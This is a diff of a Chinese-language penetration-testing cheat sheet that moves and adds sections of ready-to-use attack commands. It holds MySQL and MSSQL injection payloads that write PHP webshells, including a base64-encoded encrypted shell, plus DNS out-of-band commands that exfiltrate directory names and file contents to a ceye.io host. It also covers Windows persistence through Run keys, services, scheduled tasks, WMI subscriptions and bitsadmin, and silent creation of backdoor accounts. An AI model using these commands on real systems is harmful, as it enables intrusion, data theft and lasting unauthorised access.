@@ -216,9 +216,6 @@ grep -rn "test" ./src
 ```
 
 
-
-
-
 ## 匿名文件存储
 可用命令行   
 https://transfer.sh/
@@ -770,49 +767,34 @@ C:\Program Files\Oray\SunLogin\SunloginClient\config.ini [默认路径]
 其他，也可以用各个厂商的云助手来控制。成本有点高，但是免杀效果好。看个人需求选择。
 
 
-## ssh
-无记录shell
+## ssh无记录shell
+
 
 ```
  ssh -T root@192.168.1.1 /usr/bin/bash -i
 ```
 
-## mysql
 
-开远程
 
-```
-use mysql;  
-update user set host = '%' where user = 'root';  
-FLUSH PRIVILEGES ;  
-select host, user from user;
- mysql -uroot -p -e "select * from mysql.user;" >1.txt
-```
-
-不登录直接执行sql
-```
-mysql -uaHmin -proot test -e "select now()" -N >H:/work/target1.txt
-mysql -uroot -e "show databases;" >1.txt
-```
-
-mysql getshell
+## ssh无交互添加用户
 
 ```
-show variables like '%secure%'    
-select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
-select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
+useradd newuser;echo "newuser:password"|chpasswd
 ```
 
 ```
-set global general_log=on;  
-set global general_log_file='/var/www/1.php';  
-select '<?php eval($_POST[s6]) ?>';
+useradd -p `openssl passwd 123456` guest
 ```
 
 ```
-select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';
+useradd -p "$(openssl passwd 123456)" guest
+```
 
 ```
+useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
+```
+
+
 
 ## sqlmap
 
@@ -857,9 +839,49 @@ python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as
 python sqlmap.py -u "http://www.vuln.cn/post.php?id=1&pwd=11;*&page=1&clientip=1" --dbms mssql --proxy "http://192.168.2.144:8443" --tamper=custom_key_tamper -v 3 --batch --random-agent
 ```
 
-## sql注入
 
-### mssql 
+## mysql注入
+
+开远程
+
+```
+use mysql;  
+update user set host = '%' where user = 'root';  
+FLUSH PRIVILEGES ;  
+select host, user from user;
+ mysql -uroot -p -e "select * from mysql.user;" >1.txt
+```
+
+不登录直接执行sql
+```
+mysql -uaHmin -proot test -e "select now()" -N >H:/work/target1.txt
+mysql -uroot -e "show databases;" >1.txt
+```
+
+mysql getshell
+
+```
+show variables like '%secure%'    
+select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
+select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
+```
+
+```
+set global general_log=on;  
+set global general_log_file='/var/www/1.php';  
+select '<?php eval($_POST[s6]) ?>';
+```
+
+```
+select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';
+
+```
+
+
+
+
+## mssql注入
+
 堆叠注入，xpcmdshell
 ```
 http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
@@ -1046,7 +1068,7 @@ find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;don
 >medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
 ```
 
-## python交互shell
+## python开启交互shell
 
 py3
 
@@ -1066,25 +1088,7 @@ history -c
 ```
 
 
-## 无交互添加用户
-
-```
-useradd newuser;echo "newuser:password"|chpasswd
-```
-
-```
-useradd -p `openssl passwd 123456` guest
-```
-
-```
-useradd -p "$(openssl passwd 123456)" guest
-```
-
-```
-useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
-```
-
-### windows添加用户
+## windows添加用户
 
 bypass
 https://github.com/lengjibo/NetUser
@@ -1288,73 +1292,6 @@ netstat -an|find "3389"
 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
 ```
 
-
-## 命令执行无回显外带oob
-#### Windows
-在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
-```
-echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
-```
-下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。
-```
-for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
-```
-为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。
-```
-echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
-```
-如果需要外带多行命令，则需要以下语句：
-```
-where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
-```
-win常用变量
-```
-//变量                     类型       描述
-//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
-//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
-//%CD%                     本地       返回当前目录字符串。
-//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
-//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
-//%COMPUTERNAME%           系统       返回计算机的名称。
-//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
-//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
-//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
-//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
-//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
-//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
-//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
-//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
-//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
-//%PATH%                   系统       指定可执行文件的搜索路径。
-//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
-//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
-//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
-//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
-//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
-//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
-//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
-//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
-//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
-//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
-//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
-//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
-//%USERNAME%               本地       返回当前登录的用户的名称。
-//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
-//%WINDIR%                 系统       返回操作系统目录的位置。
-```
-#### Linux
-在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
-```
-ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
-```
-base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。
-```
-pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
-```
-如果有多行数据需要外带，那么请考虑下面的语句。
-```
-var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
-```
 
 ## windows短文件名
 短文件名查看
@@ -1568,131 +1505,6 @@ curl -O http://www.linux.com/dodo1.JPG
 下载后，上线
 ```
 chmod +x /tmp/aliyun&&/tmp/aliyun
-```
-
-
-## windows权限维持
-
-### Startup目录
-```
-NT6以后的目录如下：
-
-对当前用户有效：
-C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-对所有用户有效：
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-NT6以前的目录如下：
-
-对当前用户有效：
-C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
-对所有用户有效：
-C:\Documents and Settings\All Users\「开始」菜单\程序\启动
-
-```
-### 注册键
-
-```
-reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"
-```
-
-```
-1.Load注册键
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load
-
-2.Userinit注册键
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
-通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。
-
-3.Explorer＼Run注册键
-Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
-Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
-
-4.RunServicesOnce注册键
-RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce
-
-5.RunServices注册键
-RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices
-
-6.RunOnce＼Setup注册键
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
-
-7.RunOnce注册键
-安装程序通常用RunOnce键自动运行程序，它的位置在
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
-[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
-HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。
-
-8.Run注册键
-HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
-HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
-Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
-```
-
-### 服务
-```
-sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
-```
-
-### 计划任务
-
-```
-SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
-```
-
-### WMI事件
-
-```
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"
-
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"
-
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
-
-```
-
-### 屏幕保护
-
-```
-reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
-reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
-reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
-reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
-```
-
-### bitsadmin
-```
-bitsadmin /create evil
-bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
-bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
-bitsadmin /Resume evil
-```
-
-### Netsh白加黑
-
-```
-可以通过导入helperdll的方式做权限维持，命令格式如下：
-netsh add helper [Absolute evil DLL path]
-但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"
-重新启动后依然可获得shell：
-```
-
-### MSDTC
-
-在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。
-默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
-```
-sc qc msdtc
-sc config msdtc start= auto
-
 ```
 
 
@@ -1990,7 +1802,7 @@ cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
 ```
 
 
-cme停止维护，替代品为netexec
+cme停止维护，替代品为netexec  
 https://github.com/Pennyw0rth/NetExec
 
 干净的linux环境
@@ -2014,6 +1826,19 @@ pyenv install 3.10.0
 pyenv global 3.10.0
 
 python -m pip install --upgrade pip
+
+pyenv是下载Python源码到本地编译，容易编译失败。用conda替代
+
+wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
+wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh
+
+bash Miniconda3-latest-Linux-x86_64.sh
+
+source ~/.bashrc
+
+conda create -n nxc python=3.10
+conda activate nxc
+
 ```
 
 安装
@@ -2034,6 +1859,10 @@ https://www.netexec.wiki/
 ```
 nxc <protocol> <target(s)> -u username -p password
 nxc <protocol> <IP> -d <DOMAIN> -u Administrator -p 'password'
+```
+
+使用
+```
 
 
 nxc smb 192.168.1.50 -u 'admin' -p 'pass' -x 'whoami'
@@ -2070,6 +1899,204 @@ By default nxc will fail over to a different execution method if one fails. It a
 
 If you want to force nxc to use only one execution method you can specify which one using the `--exec-method` flag.
 ```
+
+
+
+
+## 命令执行无回显外带oob
+#### Windows
+在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
+```
+echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
+```
+下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。
+```
+for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
+```
+为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。
+```
+echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
+```
+如果需要外带多行命令，则需要以下语句：
+```
+where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
+```
+win常用变量
+```
+//变量                     类型       描述
+//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
+//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
+//%CD%                     本地       返回当前目录字符串。
+//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
+//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
+//%COMPUTERNAME%           系统       返回计算机的名称。
+//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
+//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
+//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
+//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
+//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
+//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+//%PATH%                   系统       指定可执行文件的搜索路径。
+//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
+//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
+//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
+//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
+//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
+//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
+//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
+//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
+//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
+//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
+//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
+//%USERNAME%               本地       返回当前登录的用户的名称。
+//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
+//%WINDIR%                 系统       返回操作系统目录的位置。
+```
+#### Linux
+在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
+```
+ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
+```
+base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。
+```
+pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
+```
+如果有多行数据需要外带，那么请考虑下面的语句。
+```
+var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
+```
+
+
+
+## windows权限维持
+
+### Startup目录
+```
+NT6以后的目录如下：
+
+对当前用户有效：
+C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+对所有用户有效：
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+NT6以前的目录如下：
+
+对当前用户有效：
+C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
+对所有用户有效：
+C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+
+```
+### 注册键
+
+```
+reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"
+```
+
+```
+1.Load注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load
+
+2.Userinit注册键
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
+通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。
+
+3.Explorer＼Run注册键
+Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
+Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+
+4.RunServicesOnce注册键
+RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce
+
+5.RunServices注册键
+RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices
+
+6.RunOnce＼Setup注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
+
+7.RunOnce注册键
+安装程序通常用RunOnce键自动运行程序，它的位置在
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
+[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
+HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。
+
+8.Run注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
+Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
+```
+
+### 服务
+```
+sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
+```
+
+### 计划任务
+
+```
+SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
+```
+
+### WMI事件
+
+```
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"
+
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"
+
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
+
+```
+
+### 屏幕保护
+
+```
+reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
+reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
+reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
+reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
+```
+
+### bitsadmin
+```
+bitsadmin /create evil
+bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
+bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
+bitsadmin /Resume evil
+```
+
+### Netsh白加黑
+
+```
+可以通过导入helperdll的方式做权限维持，命令格式如下：
+netsh add helper [Absolute evil DLL path]
+但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"
+重新启动后依然可获得shell：
+```
+
+### MSDTC
+
+在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。
+默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
+```
+sc qc msdtc
+sc config msdtc start= auto
+
+```
+
+
 
 
 
